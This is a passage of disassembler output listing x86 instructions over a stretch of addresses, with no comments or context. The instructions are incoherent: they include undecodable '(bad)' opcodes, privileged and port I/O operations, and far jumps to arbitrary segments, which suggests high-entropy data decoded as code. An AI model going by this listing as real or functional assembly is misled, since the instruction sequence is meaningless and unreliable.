  4134ab:	sbb    BYTE PTR [edx+edi*4],bh
  4134ae:	cs pop edi
  4134b0:	into   
  4134b1:	dec    edx
  4134b2:	repz push eax
  4134b4:	sub    al,0x4a
  4134b6:	sbb    edi,DWORD PTR [edx+0x56]
  4134b9:	mov    al,ds:0x4ec3d649
  4134be:	jl     0x413487
  4134c0:	nop
  4134c1:	std    
  4134c2:	or     BYTE PTR [eax],0x6e
  4134c5:	xor    al,0xe1
  4134c7:	test   eax,0x560fb36a
  4134cc:	add    dh,BYTE PTR [edi-0x7f]
  4134cf:	sahf   
  4134d0:	jecxz  0x4134ae
  4134d2:	ror    BYTE PTR [edi],0x90
  4134d5:	lods   eax,DWORD PTR ds:[esi]
  4134d6:	add    BYTE PTR [ebx+0x45],al
  4134d9:	add    cl,BYTE PTR [edi]
  4134db:	xor    DWORD PTR [edx+eiz*8-0x2350024c],esp
  4134e2:	add    BYTE PTR [esi+0x7fb07ab9],dh
  4134e8:	xor    cl,bl
  4134ea:	ins    DWORD PTR es:[edi],dx
  4134eb:	lods   eax,DWORD PTR ds:[esi]
  4134ec:	sub    esi,DWORD PTR [edi+0x6]
  4134ef:	adc    al,BYTE PTR [esi+eiz*1-0x60]
  4134f3:	jmp    0xdc51d699
  4134f8:	xor    bl,ch
  4134fa:	mov    ebx,0xf31e039
  4134ff:	jp     0x4134c8
  413501:	femms  
  413503:	lock ja 0x4134d7
  413506:	push   edx
  413507:	mov    bh,0x6
  413509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41350a:	sub    edx,DWORD PTR ds:0x20f1de7d
  413510:	cmp    BYTE PTR [ebx+0x69],dl
  413513:	inc    ebp
  413514:	call   FWORD PTR [esi]
  413516:	add    BYTE PTR [esi-0x785405b3],dl
  41351c:	sub    BYTE PTR [edx],bh
  41351e:	rcr    DWORD PTR [esi+0x73],cl
  413521:	les    ebp,FWORD PTR [edi-0x182e488e]
  413527:	sbb    al,BYTE PTR [ecx+0x449dd506]
  41352d:	jb     0x4134bc
  41352f:	hlt    
  413530:	aad    0x4c
  413532:	lock stos BYTE PTR es:[edi],al
  413534:	cmp    bh,0x69
  413537:	repz push edi
  413539:	inc    ebp
  41353a:	sti    
  41353b:	stc    
  41353c:	stos   BYTE PTR es:[edi],al
  41353d:	and    al,0xa6
  41353f:	ins    BYTE PTR es:[edi],dx
  413540:	jae    0x4134f6
  413542:	ins    BYTE PTR es:[edi],dx
  413543:	test   eax,0xfaf38eb
  413549:	inc    edi
  41354a:	and    al,0x74
  41354c:	or     al,0x11
  41354e:	jno    0x413570
  413550:	jne    0x4134ec
  413552:	cwde   
  413553:	sub    eax,0xa82a7523
  413558:	adc    BYTE PTR [ebx],cl
  41355a:	sbb    DWORD PTR [ecx+eax*2],ebx
  41355d:	scas   al,BYTE PTR es:[edi]
  41355e:	fcomp  QWORD PTR [edi+edi*1-0x7f]
  413562:	int    0x71
  413564:	xor    eax,0x16e33ce0
  413569:	mov    edi,0xc62e82bb
  41356e:	jg     0x413565
  413570:	jmp    0x4489:0xad0704a7
  413577:	adc    al,0xf1
  413579:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41357b:	shr    BYTE PTR [eax],0x22
  41357e:	test   al,0x22
  413580:	adc    ebx,DWORD PTR [ebx+0x12]
  413583:	xor    bh,BYTE PTR [eax-0x2]
  413586:	push   cs
  413587:	mov    dh,0xff
  413589:	aaa    
  41358a:	dec    ecx
  41358b:	mov    dl,0xa3
  41358d:	cmc    
  41358e:	xchg   dh,bl
  413590:	inc    esi
  413591:	mov    eax,ds:0xb5ff23b2
  413596:	or     al,0x3a
  413598:	outs   dx,DWORD PTR ds:[esi]
  413599:	(bad)  
  41359a:	sbb    dh,BYTE PTR [ecx]
  41359c:	jnp    0x4135cb
  41359e:	mov    cl,0x12
  4135a0:	mov    bh,0x19
  4135a2:	in     al,dx
  4135a3:	(bad)  
  4135a4:	xchg   ebp,eax
  4135a5:	dec    ecx
  4135a6:	sbb    ecx,esp
  4135a8:	scas   al,BYTE PTR es:[edi]
  4135a9:	xor    ch,al
  4135ab:	jmp    0x6032:0x593748c6
  4135b2:	cmp    esi,ecx
  4135b4:	pop    ebx
  4135b5:	pop    eax
  4135b6:	leave  
  4135b7:	and    eax,0xc80398d5
  4135bc:	sub    BYTE PTR [ecx-0x13],dl
  4135bf:	and    al,0x8c
  4135c1:	pop    esp
  4135c2:	jb     0x413579
  4135c4:	in     eax,0x58
  4135c6:	sahf   
  4135c7:	cmp    BYTE PTR [ebp-0x2a],dh
  4135ca:	or     eax,esi
  4135cc:	pusha  
  4135cd:	pop    ecx
  4135ce:	mov    ch,0x6d
  4135d0:	stos   BYTE PTR es:[edi],al
  4135d1:	push   ecx
  4135d2:	mov    esp,ebx
  4135d4:	jno    0x413623
  4135d6:	(bad)
  4135da:	cmp    al,BYTE PTR [ebp+0x15306186]
  4135e0:	dec    ebp
  4135e1:	out    0x72,eax
  4135e3:	push   0xffffff8a
  4135e5:	(bad)  
  4135e6:	imul   DWORD PTR [esi-0x65]
  4135e9:	xchg   ebp,eax
  4135ea:	pushf  
  4135eb:	dec    eax
  4135ec:	mov    esi,0xd7418bd5
  4135f1:	inc    DWORD PTR [edi+esi*2-0x5e]
  4135f5:	mov    bl,0x1d
  4135f7:	repz into 
  4135f9:	div    DWORD PTR [esi]
  4135fb:	popf   
  4135fc:	push   ds
  4135fd:	or     bl,dh
  4135ff:	pextrw edi,mm3,0x8
  413603:	xlat   BYTE PTR ds:[ebx]
  413604:	lds    edi,FWORD PTR [edx+0x643c9d36]
  41360a:	mov    ds:0xd59067ca,eax
  41360f:	retf   
  413610:	outs   dx,BYTE PTR fs:[esi]
  413612:	es (bad) 
  413615:	cdq    
  413616:	and    DWORD PTR [ebp+edx*2-0x2da53878],edx
  41361d:	call   0xed5c:0xaa9fba1b
  413624:	ja     0x41367e
  413626:	mov    bh,0x12
  413628:	outs   dx,BYTE PTR ds:[esi]
  413629:	imul   eax,DWORD PTR [esi+0x1257afaa],0xffffffdd
  413630:	push   ebp
  413631:	inc    edx
  413632:	and    al,0x42
  413634:	lea    esi,[edx+0x520616bc]
  41363a:	mov    esp,0x7ead410
  41363f:	pop    edi
  413640:	xchg   esp,eax
  413641:	cmp    al,0xff
  413643:	data16 (bad) 
  413645:	repz add DWORD PTR [ecx+0x165cf256],ecx
  41364c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41364d:	push   ebp
  41364e:	out    0xa4,eax
  413650:	inc    ebp
  413651:	adc    al,0x2e
  413653:	push   edi
  413654:	mov    esi,0x9cf933ea
  413659:	xchg   edi,eax
  41365a:	jae    0x413624
  41365c:	retf   0x5140
  41365f:	in     al,0xe9
  413661:	ror    BYTE PTR [esp+ecx*2],cl
  413664:	sahf   
  413665:	jmp    0xae7104c8
  41366a:	repz xchg edi,eax
  41366c:	aam    0x1e
  41366e:	icebp  
  41366f:	adc    DWORD PTR [edi],esi
  413671:	in     al,dx
  413672:	or     edx,DWORD PTR [eax-0x4e]
  413675:	clc    
  413676:	aad    0xe7
  413678:	shl    BYTE PTR [ecx-0x7eece7d0],0x7
  41367f:	cmp    BYTE PTR [ebp+0x22],al
  413682:	and    BYTE PTR [edx],dh
  413684:	inc    eax
  413685:	sbb    BYTE PTR [eax-0x5d6e10a6],0xcd
  41368c:	psraw  mm5,QWORD PTR [eax-0x7c]
  413690:	mov    WORD PTR ds:0x9840e0fb,ds
  413696:	mov    WORD PTR [esi+0x12af6801],?
  41369c:	dec    edx
  41369d:	xlat   BYTE PTR ds:[ebx]
  41369e:	or     eax,0xcb0d0a7d
  4136a3:	mov    edx,0x5b778e08
  4136a8:	inc    DWORD PTR [ebp+0x2efae64b]
  4136ae:	add    ecx,DWORD PTR gs:[ecx-0x19]
  4136b2:	mov    al,dl
  4136b4:	adc    DWORD PTR [esi],ebp
  4136b6:	fiadd  WORD PTR [ebp-0x4922bd68]
  4136bc:	(bad)  
  4136bd:	fcmovnu st,st(3)
  4136bf:	mov    ebx,0xad00af44
  4136c4:	cdq    
  4136c5:	shl    DWORD PTR [eax+ecx*8],cl
  4136c8:	ds inc edx
  4136ca:	cwde   
  4136cb:	mov    edi,0xebbb7c1b
  4136d0:	sbb    al,0xaa
  4136d2:	ds (bad) 
  4136d5:	stos   DWORD PTR es:[edi],eax
  4136d6:	test   BYTE PTR [ebp-0x21],0x68
  4136da:	mov    ch,0x61
  4136dc:	jmp    0x69589aa0
  4136e1:	(bad)  
  4136e2:	cmp    ch,BYTE PTR [esp+eiz*2+0x56d5f63e]
  4136e9:	inc    eax
  4136ea:	pushf  
  4136eb:	lods   eax,DWORD PTR ds:[esi]
  4136ec:	pusha  
  4136ed:	je     0x4136e2
  4136ef:	data16 js 0x4136db
  4136f2:	and    bh,BYTE PTR ds:0x8a613f87
  4136f8:	imul   edi,DWORD PTR [ebx+0x115a951],0xffffffa7
  4136ff:	sbb    BYTE PTR [esi],0x2b
  413702:	mov    eax,0x161bc831
  413707:	mov    dl,bl
  413709:	out    dx,eax
  41370a:	lea    ecx,[ebx-0xe97ebd7]
  413710:	pop    esp
  413711:	push   ds
  413712:	mov    eax,ds:0xa1e044a0
  413717:	imul   edx,eax,0xf8b83322
  41371d:	outs   dx,DWORD PTR ds:[esi]
  41371e:	mov    ebx,DWORD PTR [ebx+0xd]
  413721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413722:	ud0    ebp,DWORD PTR [eax]
  413725:	pop    esp
  413726:	outs   dx,BYTE PTR ds:[esi]
  413727:	mov    edi,esp
  413729:	fistp  QWORD PTR [edi+0x7da78cb8]
  41372f:	or     bl,bl
  413731:	scas   al,BYTE PTR es:[edi]
  413732:	mov    eax,ds:0x9e7f31f
  413737:	sbb    BYTE PTR [ebx-0x42820af6],ah
  41373d:	sbb    DWORD PTR [edx],esp
  41373f:	dec    esi
  413740:	push   ds
  413741:	dec    edi
  413742:	fsub   DWORD PTR [ecx]
  413744:	imul   esp
  413746:	(bad)  
  413748:	add    eax,0x585e397c
  41374d:	sub    ah,BYTE PTR ds:0x951a015
  413753:	nop
  413754:	bound  esi,QWORD PTR fs:[edx-0x9]
  413758:	loop   0x4136f1
  41375a:	ds std 
  41375c:	mov    ebp,0x3cba428
  413761:	dec    ebp
  413762:	xor    al,0x13
  413764:	sbb    dl,BYTE PTR [edi]
  413766:	jmp    0x1273:0x48d0b768
  41376d:	xchg   edi,eax
  41376e:	lods   eax,DWORD PTR ds:[esi]
  41376f:	int    0x98
  413771:	jnp    0x4137ec
  413773:	adc    BYTE PTR [ecx-0x9d4e0b0],ch
  413779:	int    0x59
  41377b:	mov    ebx,0x9dac8ce3
  413780:	call   DWORD PTR [edx]
  413782:	adc    al,0x31
  413784:	xchg   ebx,eax
  413785:	add    dh,BYTE PTR [edx]
  413787:	mov    dl,0xe5
  413789:	or     eax,0x2d1e080c
  41378e:	lock xchg BYTE PTR [ebp-0x4e],ch
  413792:	pop    ecx
  413793:	inc    ebp
  413794:	in     al,dx
  413795:	leave  
  413796:	iret   
  413797:	ja     0x413778
  413799:	rol    eax,1
  41379b:	dec    ecx
  41379c:	sahf   
  41379d:	push   ds
  41379e:	xlat   BYTE PTR ds:[ebx]
  41379f:	leave  
  4137a0:	in     al,dx
  4137a1:	in     eax,0x6b
  4137a3:	xor    al,0xed
  4137a5:	das    
  4137a6:	outs   dx,BYTE PTR ds:[esi]
  4137a7:	push   ss
  4137a8:	dec    esp
  4137a9:	cld    
  4137aa:	inc    esp
  4137ab:	cmp    eax,0x17ce4423
  4137b0:	dec    edi
  4137b1:	rcr    BYTE PTR [eax+0x45],cl
  4137b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137b5:	cwde   
  4137b6:	iret   
  4137b7:	call   0x1b86:0xa2ead029
  4137be:	test   al,0x94
  4137c0:	cmp    BYTE PTR [edi],dh
  4137c2:	mov    al,0x5e
  4137c4:	mov    esi,0x8ebf4fdc
  4137c9:	pop    esp
  4137ca:	cmp    esi,esi
  4137cc:	test   eax,0xf2de9d45
  4137d1:	fwait
  4137d2:	jbe    0x413832
  4137d4:	popa   
  4137d5:	and    edi,DWORD PTR [esi-0x5d]
  4137d8:	clc    
  4137d9:	clc    
  4137da:	jno    0x4137f8
  4137dc:	add    ecx,edx
  4137de:	jl     0x413814
  4137e0:	aas    
  4137e1:	sbb    al,0xb2
  4137e3:	mov    ebp,0x28ac4ad6
  4137e8:	pop    ecx
  4137e9:	or     DWORD PTR ds:0xbb57e692,ebx
  4137ef:	xlat   BYTE PTR ds:[ebx]
  4137f0:	mov    ds:0xb710fcfc,al
  4137f5:	daa    
  4137f6:	jbe    0x41382b
  4137f8:	jns    0x413818
  4137fa:	xchg   ecx,eax
  4137fb:	fidivr DWORD PTR [ebp+0x3a]
  4137fe:	push   cs
  4137ff:	adc    bh,bl
  413801:	dec    edx
  413802:	xchg   BYTE PTR ds:0x5cd1bf,bh
  413808:	es jo  0x41380d
  41380b:	mov    ds:0xe1b3bac9,al
  413810:	lahf   
  413811:	xor    al,0xcc
  413813:	(bad)  
  413814:	xchg   esp,eax
  413815:	loop   0x4137f9
  413817:	sbb    esp,ecx
  413819:	mov    al,ds:0x9f4862bf
  41381e:	pop    edi
  41381f:	cmp    edx,DWORD PTR [edx+0x38a11f76]
  413825:	call   0xb48e:0x4d7a0cdc
  41382c:	dec    edi
  41382d:	pop    ss
  41382e:	push   cs
  41382f:	xchg   ebp,eax
  413830:	aad    0x44
  413832:	sub    eax,0xcc0d031
  413837:	lods   al,BYTE PTR ds:[esi]
  413838:	adc    eax,0x379ab440
  41383d:	mov    dl,0x9f
  41383f:	sub    eax,0x2c4c98ba
  413844:	add    al,0xce
  413846:	jno    0x413884
  413848:	mov    ecx,cr3
  41384b:	cmp    eax,0x6b2be700
  413850:	(bad)  
  413851:	shr    dl,cl
  413853:	fstp   TBYTE PTR [ebp+0x49]
  413856:	jge    0x413881
  413858:	fdivrp st(1),st
  41385a:	dec    esp
  41385b:	mov    cs,WORD PTR [edx]
  41385d:	lods   al,BYTE PTR cs:[esi]
  41385f:	jno    0x41387f
  413861:	js     0x413884
  413863:	das    
  413864:	enter  0x513e,0x39
  413868:	and    ch,BYTE PTR [edi+0x64]
  41386b:	pusha  
  41386c:	jns    0x4138b4
  41386e:	adc    eax,0xc103380c
  413873:	jg     0x413819
  413875:	jb     0x41381a
  413877:	push   ebp
  413878:	push   ebx
  413879:	mov    esi,0xc3dd6bf5
  41387e:	add    DWORD PTR [ebp-0x11fb3b8a],eax
  413884:	popf   
  413885:	pushw  ss
  413887:	ret    0x7578
  41388a:	mul    DWORD PTR [edx-0x13]
  41388d:	adc    DWORD PTR [edi+0x7f3cd630],esi
  413893:	xor    edi,0xc03d41f7
  413899:	call   0xae7c:0xe6805da3
  4138a0:	mov    WORD PTR [eax],gs
  4138a2:	arpl   WORD PTR [eax+0x63],si
  4138a5:	imul   edx,DWORD PTR [edx-0x70],0x2
  4138a9:	or     al,0x3a
  4138ab:	scas   al,BYTE PTR es:[edi]
  4138ac:	aaa    
  4138ad:	xchg   edi,eax
  4138ae:	mov    bh,0xf2
  4138b0:	popa   
  4138b1:	jg     0x4138fe
  4138b3:	adc    eax,0x43d54a2
  4138b8:	mov    dl,0x6f
  4138ba:	shr    BYTE PTR [edx],cl
  4138bc:	push   ds
  4138bd:	daa    
  4138be:	inc    ebx
  4138bf:	mov    bl,0xb5
  4138c1:	pushf  
  4138c2:	(bad)  
  4138c3:	ss push es
  4138c5:	push   ss
  4138c6:	shr    BYTE PTR [edi-0x3309470a],cl
  4138cc:	fbld   TBYTE PTR [edx-0x36]
  4138cf:	scas   al,BYTE PTR es:[edi]
  4138d0:	or     DWORD PTR [ecx],0xffffffea
  4138d3:	aam    0x1a
  4138d5:	dec    ebx
  4138d6:	xor    al,0x18
  4138d8:	mov    ss,edx
  4138da:	mov    bl,0xa9
  4138dc:	xchg   ebx,eax
  4138dd:	or     BYTE PTR [edx+0x2d],dh
  4138e0:	mov    dx,0xdeb7
  4138e4:	mov    ah,0x9f
  4138e6:	mov    esi,0x5a815cb7
  4138eb:	xor    DWORD PTR [ecx-0x152415c2],ebx
  4138f1:	and    ebp,esi
  4138f3:	mov    ch,0x19
  4138f5:	mov    ch,0xec
  4138f7:	pusha  
  4138f8:	repz icebp 
  4138fa:	jmp    0x4bc9:0x8de79ead
  413901:	mov    esi,0x85364347
  413906:	pop    esi
  413907:	dec    esp
  413908:	mov    esi,0xf48e4f0d
  41390d:	shr    DWORD PTR [esi-0x3f],1
  413910:	imul   edi,ebp,0xeeb2479b
  413916:	or     ebp,DWORD PTR [ebx+0x18609e36]
  41391c:	out    dx,al
  41391d:	mov    ebp,0xf9befe7c
  413922:	cmp    al,0x97
  413924:	std    
  413925:	pushf  
  413926:	ret    
  413927:	enter  0xc9ad,0x59
  41392b:	ret    0xd63c
  41392e:	call   0x93595e4e
  413933:	and    al,ch
  413935:	xchg   ecx,eax
  413936:	sti    
  413937:	fcom   QWORD PTR [esi]
  413939:	fcmovnbe st,st(6)
  41393b:	inc    ecx
  41393c:	aad    0xec
  41393e:	mov    ecx,0x92ae2947
  413943:	dec    edi
  413944:	int    0xf3
  413946:	inc    eax
  413947:	pop    edi
  413948:	mov    ecx,0xe60d2ef
  41394d:	mov    ds:0x63fd5e02,al
  413952:	xlat   BYTE PTR ds:[ebx]
  413953:	aad    0x4
  413955:	cmp    al,0x39
  413957:	ins    DWORD PTR es:[edi],dx
  413958:	inc    edx
  413959:	mov    dl,0xc4
  41395b:	xor    al,0xf8
  41395d:	mov    DWORD PTR [ecx],eax
  41395f:	pop    ds
  413960:	cdq    
  413961:	xor    al,0x6
  413963:	stc    
  413964:	adc    bh,BYTE PTR [ecx]
  413966:	mov    ds:0xd4fb4e2a,al
  41396b:	sub    DWORD PTR [eax-0x1a0c3411],ebp
  413971:	cs xchg ebx,eax
  413973:	out    dx,eax
  413974:	fwait
  413975:	test   eax,0xd1219fb8
  41397a:	addr16 push 0x780a8850
  413980:	mov    bl,0xe5
  413982:	call   0x86024cd3
  413987:	jbe    0x4139b1
  413989:	jmp    0x413a05
  41398b:	les    esp,FWORD PTR [edx+ecx*8-0x25]
  41398f:	or     dl,cl
  413991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413992:	mov    ch,0xf7
  413994:	loope  0x413916
  413996:	push   ebx
  413997:	push   eax
  413998:	xor    esi,eax
  41399a:	xchg   bl,dh
  41399c:	stc    
  41399d:	inc    ecx
  41399e:	xor    edi,DWORD PTR [ecx-0x1e]
  4139a1:	scas   al,BYTE PTR es:[edi]
  4139a2:	mov    edi,0x7bf7eafe
  4139a7:	clc    
  4139a8:	lods   al,BYTE PTR ds:[esi]
  4139a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139aa:	or     eax,0x3337b7e0
  4139af:	adc    eax,0x72f64726
  4139b4:	out    0x79,al
  4139b6:	and    ah,BYTE PTR [eax]
  4139b8:	mov    WORD PTR [edx+0x19],?
  4139bb:	lds    eax,FWORD PTR [edi+0x65]
  4139be:	xchg   edx,eax
  4139bf:	sbb    eax,0xb4229b6a
  4139c4:	shr    esi,0x5e
  4139c7:	scas   eax,DWORD PTR es:[edi]
  4139c8:	(bad)
  4139cb:	push   ebx
  4139cc:	sbb    al,0x3a
  4139ce:	push   bx
  4139d0:	retf   
  4139d1:	inc    ecx
  4139d2:	cmp    eax,0xd96bac40
  4139d7:	push   cs
  4139d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139d9:	pop    ebp
  4139da:	sbb    DWORD PTR [edi],edx
  4139dc:	and    eax,0x7d6c8470
  4139e1:	hlt    
  4139e2:	out    0x56,eax
  4139e4:	shr    DWORD PTR [ecx+0x59218b52],cl
  4139ea:	aaa    
  4139eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139ec:	and    al,0x20
  4139ee:	dec    esi
  4139ef:	sbb    ebp,0xa6c10832
  4139f5:	sub    eax,0xa5e5cf80
  4139fa:	xor    DWORD PTR [edx],edi
  4139fc:	dec    ecx
  4139fd:	mov    al,0xd3
  4139ff:	xchg   edx,eax
  413a00:	into   
  413a01:	push   ecx
  413a02:	es call 0xeb0a:0x9deb8ed4
  413a0a:	add    BYTE PTR [ebx-0x5e],dl
  413a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a0e:	nop
  413a0f:	ss out 0xd7,al
  413a12:	push   0xfffffffe
  413a14:	scas   eax,DWORD PTR es:[edi]
  413a15:	mul    esp
  413a17:	inc    edx
  413a18:	xchg   esi,eax
  413a19:	lods   eax,DWORD PTR ds:[esi]
  413a1a:	lahf   
  413a1b:	jmp    0x9060:0xc997f4eb
  413a22:	xchg   esi,eax
  413a23:	gs mov eax,0x5f10bf7
  413a29:	cdq    
  413a2a:	mov    ebx,DWORD PTR [eax-0x3f]
  413a2d:	sub    BYTE PTR [edi],0xdf
  413a30:	out    dx,eax
  413a31:	loop   0x413a28
  413a33:	pop    edi
  413a34:	jp     0x4139f9
  413a36:	test   bh,cl
  413a38:	ja     0x413a4f
  413a3a:	in     eax,0x27
  413a3c:	fcmovne st,st(2)
  413a3e:	sbb    eax,0x2472a8cd
  413a43:	push   ebx
  413a44:	jle    0x413a27
  413a46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a47:	addr16 in eax,0x52
  413a4a:	push   esi
  413a4b:	push   0x25c8a89b
  413a50:	dec    esi
  413a51:	int    0xc5
  413a53:	(bad)  [ebx]
  413a55:	adc    DWORD PTR [esi],edx
  413a57:	push   esp
  413a58:	xchg   ecx,eax
  413a59:	or     eax,0x393d35b5
  413a5e:	dec    ebp
  413a5f:	fisub  DWORD PTR [edi+0x41]
  413a62:	rcl    BYTE PTR [esi-0x9],0x52
  413a66:	push   edi
  413a67:	push   esi
  413a68:	sbb    esp,DWORD PTR [ecx-0x3563e50e]
  413a6e:	ds ret 
  413a70:	lods   eax,DWORD PTR ds:[esi]
  413a71:	repz push ebx
  413a73:	aaa    
  413a74:	sahf   
  413a75:	jl     0x413ac8
  413a77:	sub    DWORD PTR [ebp+0x5e],ecx
  413a7a:	mov    al,ds:0x4430b737
  413a7f:	adc    edx,DWORD PTR [esi-0x69af399a]
  413a85:	ror    BYTE PTR [edx],0xde
  413a88:	pop    eax
  413a89:	xlat   BYTE PTR ds:[ebx]
  413a8a:	mov    dl,0x7a
  413a8c:	pop    ebp
  413a8d:	and    BYTE PTR [ecx+0x27],dh
  413a90:	xor    eax,DWORD PTR [ebx]
  413a92:	iret   
  413a93:	cmp    edi,esp
  413a95:	pusha  
  413a96:	xchg   edx,eax
  413a97:	adc    DWORD PTR [edi-0x1e121ad0],0x2d
  413a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a9f:	mov    cl,0x2
  413aa1:	test   eax,edi
  413aa3:	mov    bh,0x31
  413aa5:	pop    ebp
  413aa6:	adc    DWORD PTR [esi+ebp*2-0x49],eax
  413aaa:	add    cl,BYTE PTR [edx]
  413aac:	icebp  
  413aad:	out    0xb4,eax
  413aaf:	mov    bh,0x33
  413ab1:	pushf  
  413ab2:	lods   al,BYTE PTR ds:[esi]
  413ab3:	xchg   esi,eax
  413ab4:	inc    ebx
  413ab5:	jge    0x413af3
  413ab7:	and    DWORD PTR [ecx],ecx
  413ab9:	loopne 0x413ace
  413abb:	je     0x413b2a
  413abd:	adc    esi,DWORD PTR [edi]
  413abf:	xchg   edi,eax
  413ac0:	mov    ch,0x8c
  413ac2:	jo     0x413a89
  413ac4:	jl     0x413a95
  413ac6:	push   cs
  413ac7:	inc    ecx
  413ac8:	or     al,0x24
  413aca:	sub    edx,DWORD PTR [edx]
  413acc:	rcr    ebp,1
  413ace:	xchg   BYTE PTR [ebx+0x7d],bh
  413ad1:	(bad)  [esi]
  413ad3:	mov    eax,ds:0xf2d98193
  413ad8:	and    DWORD PTR [eax-0xf],0xfffffffa
  413adc:	xchg   ebp,eax
  413add:	jnp    0x413ad1
  413adf:	sbb    eax,DWORD PTR [edi]
  413ae1:	das    
  413ae2:	jp     0x413ada
  413ae4:	jg     0x413b12
  413ae6:	out    0xbc,eax
  413ae8:	xchg   ecx,eax
  413ae9:	in     eax,dx
  413aea:	sbb    al,0xb
  413aec:	ins    DWORD PTR es:[edi],dx
  413aed:	and    BYTE PTR [edi+ebx*2+0x31],cl
  413af1:	test   BYTE PTR [ecx+0x28],bh
  413af4:	mov    DWORD PTR [edx-0x49aaacee],edi
  413afa:	inc    esi
  413afb:	jle    0x413b61
  413afd:	mov    eax,DWORD PTR [ecx+0xa8b407e]
  413b03:	xlat   BYTE PTR ds:[ebx]
  413b04:	(bad)  
  413b05:	out    dx,al
  413b06:	mul    BYTE PTR [edx+edi*1-0x57ffc636]
  413b0d:	push   ebp
  413b0e:	fdiv   QWORD PTR [edx-0x3f]
  413b11:	xlat   BYTE PTR ds:[ebx]
  413b12:	nop
  413b13:	pop    ebx
  413b14:	das    
  413b15:	out    dx,al
  413b16:	xor    bl,dl
  413b18:	test   eax,0xfa58fa81
  413b1d:	inc    edx
  413b1e:	jl     0x413aa7
  413b20:	dec    esi
  413b21:	push   esi
  413b22:	mov    esi,0xf50325f2
  413b27:	inc    esp
  413b28:	das    
  413b29:	clc    
  413b2a:	sub    al,0x22
  413b2c:	push   0x1406113c
  413b31:	outs   dx,BYTE PTR ds:[esi]
  413b32:	aad    0xab
  413b34:	pop    eax
  413b35:	rcl    esp,cl
  413b37:	push   es
  413b38:	stc    
  413b39:	sub    al,0x76
  413b3b:	adc    bh,ah
  413b3d:	pusha  
  413b3e:	mov    esi,0x3137ce00
  413b43:	pop    eax
  413b44:	pop    ds
  413b45:	or     eax,0x913df704
  413b4a:	imul   ecx,DWORD PTR [esi],0xa70c7435
  413b50:	inc    ebx
  413b51:	and    edi,DWORD PTR [ecx-0x3b]
  413b54:	ret    
  413b55:	sbb    DWORD PTR [eax-0x47],0xd452801f
  413b5c:	call   0x98b1:0x9391e615
  413b63:	lods   al,BYTE PTR ds:[esi]
  413b64:	neg    DWORD PTR [esi-0x61]
  413b67:	dec    edi
  413b68:	retf   
  413b69:	sub    bh,BYTE PTR [ecx]
  413b6b:	jmp    0xb66a21ec
  413b70:	rcr    DWORD PTR [edx+0x7aae45f4],cl
  413b76:	jl     0x413bdf
  413b78:	cwde   
  413b79:	vmwrite ebx,DWORD PTR [eax+ebp*1]
  413b7d:	add    BYTE PTR [edi],ch
  413b7f:	es sub eax,0x19449be
  413b85:	enter  0x8076,0xe0
  413b89:	popf   
  413b8a:	dec    ebx
  413b8b:	retf   
  413b8c:	ja     0x413bfc
  413b8e:	rcl    BYTE PTR [eax+0x21],cl
  413b91:	cmp    al,0xca
  413b93:	or     ecx,DWORD PTR [ebp-0x717abf74]
  413b99:	scas   al,BYTE PTR es:[edi]
  413b9a:	aaa    
  413b9b:	sti    
  413b9c:	icebp  
  413b9d:	mov    esp,0xc91d7723
  413ba2:	dec    ecx
  413ba3:	inc    edi
  413ba4:	push   ebx
  413ba5:	or     BYTE PTR [eax],cl
  413ba7:	add    eax,0xe33e463
  413bac:	sub    dh,BYTE PTR [edx-0x64]
  413baf:	cmp    ch,BYTE PTR [esp+edi*4-0x3d]
  413bb3:	mov    ah,0xbb
  413bb5:	outs   dx,BYTE PTR ds:[esi]
  413bb6:	inc    ebx
  413bb7:	ins    DWORD PTR es:[edi],dx
  413bb8:	cli    
  413bb9:	loope  0x413bef
  413bbb:	ds xchg edx,eax
  413bbd:	call   0xbe85b617
  413bc2:	push   ebx
  413bc3:	push   edi
  413bc4:	mov    ecx,0x8e886701
  413bc9:	push   edx
  413bca:	je     0x413bfc
  413bcc:	mov    dl,0xd6
  413bce:	mov    bl,0x77
  413bd0:	xchg   edi,eax
  413bd1:	fstp   DWORD PTR [edi-0x4dc5317f]
  413bd7:	push   edx
  413bd8:	pop    es
  413bd9:	dec    ebp
  413bda:	bound  ebp,QWORD PTR [edx+0x34]
  413bdd:	mov    ds:0x293b2d16,al
  413be2:	push   edi
  413be3:	arpl   WORD PTR [eax],sp
  413be5:	ins    DWORD PTR es:[edi],dx
  413be6:	in     al,dx
  413be7:	cmp    ah,BYTE PTR ds:0x68c70086
  413bed:	add    eax,0x4242e134
  413bf2:	cmc    
  413bf3:	(bad)  
  413bf4:	push   edx
  413bf5:	clc    
  413bf6:	mov    dh,0xf9
  413bf8:	jne    0x413b89
  413bfa:	ror    esp,0x6c
  413bfd:	(bad)  
  413bfe:	push   esp
  413bff:	xchg   ebp,eax
  413c00:	mov    BYTE PTR [ecx-0x5319ed43],dh
  413c06:	and    BYTE PTR [esi-0x795c8770],0x94
  413c0d:	cmp    eax,0xa25b0f4b
  413c12:	mov    al,0xd0
  413c14:	cmp    BYTE PTR [edi],al
  413c16:	out    dx,al
  413c17:	dec    esi
  413c18:	adc    dl,BYTE PTR [edx+edi*2]
  413c1b:	pop    ecx
  413c1c:	or     ecx,DWORD PTR ds:0xaefd6a3c
  413c22:	sub    eax,0xcffaaff6
  413c27:	jne    0x413c6c
  413c29:	cmp    eax,0xbf3d1f14
  413c2e:	test   eax,0x2f39c408
  413c33:	aam    0x10
  413c35:	ret    0x1f69
  413c38:	or     ebx,ebx
  413c3a:	jo     0x413ca4
  413c3c:	retf   
  413c3d:	jmp    DWORD PTR [ecx]
  413c3f:	not    ah
  413c41:	inc    ebp
  413c42:	mov    edx,0xfc9d69fe
  413c47:	xchg   edi,eax
  413c48:	sti    
  413c49:	sti    
  413c4a:	sub    edx,DWORD PTR [ebp+edi*8-0xf]
  413c4e:	sub    eax,0x13ffb8cf
  413c53:	mov    al,0x31
